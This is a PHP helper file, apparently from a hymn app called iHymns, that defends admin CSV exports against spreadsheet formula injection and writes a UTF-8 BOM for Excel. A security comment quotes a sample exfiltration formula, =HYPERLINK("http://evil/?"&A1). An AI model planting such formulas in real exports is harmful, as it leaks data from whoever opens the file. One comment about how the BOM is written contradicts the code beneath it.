<?php

declare(strict_types=1);

/**
 * iHymns — CSV-safe output helpers (#1386 security audit).
 *
 * Copyright (c) 2026 iHymns. All rights reserved.
 *
 * SECURITY — CSV / formula injection (CWE-1236):
 * Spreadsheet apps (Excel, Google Sheets, LibreOffice, Numbers) treat a cell
 * whose text begins with `= + - @` (or a leading TAB / CR) as a FORMULA. Our
 * admin CSV exports emit DB- and request-derived values — song titles,
 * copyright, writer/composer names, search queries, user-agents, referrers —
 * that an attacker can seed with a leading formula trigger (e.g. a search for
 * `=HYPERLINK("http://evil/?"&A1)` is logged verbatim). When an admin later
 * opens the export, the formula executes on THEIR machine (data exfiltration
 * via =HYPERLINK / =WEBSERVICE / DDE, etc.). Every exported cell must be passed
 * through ihymns_csv_cell(); ihymns_fputcsv() neutralises a whole row at once.
 *
 * @see https://owasp.org/www-community/attacks/CSV_Injection
 */

if (!function_exists('ihymns_csv_cell')) {
    /**
     * Neutralise a single CSV cell against formula injection by prefixing a
     * leading formula-trigger character with a single quote (the standard,
     * spreadsheet-recognised "treat as text" escape).
     *
     * @param mixed $value The raw cell value (cast to string).
     * @return string The formula-safe cell value.
     */
    function ihymns_csv_cell($value): string
    {
        $s = (string)$value;
        if ($s !== '' && in_array($s[0], ['=', '+', '-', '@', "\t", "\r"], true)) {
            return "'" . $s;
        }
        return $s;
    }

    /**
     * fputcsv() with every cell neutralised against formula injection.
     * Drop-in replacement for fputcsv($stream, $row) in export code.
     *
     * @param resource $stream An open writable stream (e.g. php://output).
     * @param array    $row    The row of cell values.
     */
    function ihymns_fputcsv($stream, array $row): void
    {
        fputcsv($stream, array_map('ihymns_csv_cell', $row));
    }
}

if (!function_exists('ihymns_csv_output_begin')) {
    /**
     * Open `php://output` for a CSV download and write the UTF-8 BOM
     * (#1908 Commit 4 — "D" in the epic's gap table).
     *
     * ELI5: this is the "start writing a CSV file to the browser" button.
     * It also drops three invisible bytes (EF BB BF) at the very front so
     * Excel knows the file is UTF-8 text, not old Windows text.
     *
     * WHY (detailed): Excel-on-Windows ignores the HTTP response's
     * `Content-Type: text/csv; charset=UTF-8` header for a *downloaded*
     * .csv — by the time the file is double-clicked from disk/Downloads,
     * the HTTP response is long gone, so Excel falls back to decoding the
     * bytes as the system's legacy ANSI code page. Any non-ASCII cell
     * (a songwriter's accented name, a non-Latin title — #1908's whole
     * epic) then renders as mojibake. Prefixing the byte sequence
     * `EF BB BF` (the UTF-8 byte-order mark) is the one signal Excel DOES
     * honour from the file bytes themselves: it forces a UTF-8 decode
     * regardless of the OS locale. Other consumers (LibreOffice, browsers
     * re-opening the download, `Array.from(csv)` in JS) either already
     * default to UTF-8 or explicitly skip a leading BOM, so this is safe
     * everywhere a CSV is opened, not just Excel.
     *
     * This is the ONE emitter (rule #22) — every CSV exporter in the app
     * calls this instead of inlining its own `fopen('php://output', …)` +
     * `echo "\xEF\xBB\xBF"` pair, so the BOM can never again be forgotten
     * (4 of 6 exporters were missing it) or duplicated (2 of 6 already had
     * their own inline `echo` — replaced by this call in the same commit).
     * `tests/php/test-csv-bom.php` is the tree-derived guard that enforces
     * both directions.
     *
     * @see https://en.wikipedia.org/wiki/Byte_order_mark
     * @see https://learn.microsoft.com/en-us/globalization/encoding/byte-order-mark
     * @return resource The open `php://output` stream, ready for
     *                   `ihymns_fputcsv()` / `fputcsv()` calls.
     */
    function ihymns_csv_output_begin()
    {
        // 'wb' (not 'w'): binary mode. On POSIX this is a no-op, but it
        // documents intent and matches PHP's own recommendation for
        // fopen() writes that must not have the platform silently rewrite
        // line endings (irrelevant to the BOM bytes here, but this stream
        // is reused for the whole CSV body by every caller).
        $stream = fopen('php://output', 'wb');
        // The UTF-8 BOM, written as raw bytes (not a PHP source literal
        // like "\xEF\xBB\xBF" typed elsewhere) so there is exactly ONE
        // place in the codebase that spells it out — see the double-BOM
        // ban in test-csv-bom.php.
        fwrite($stream, "\xEF\xBB\xBF");
        return $stream;
    }
}
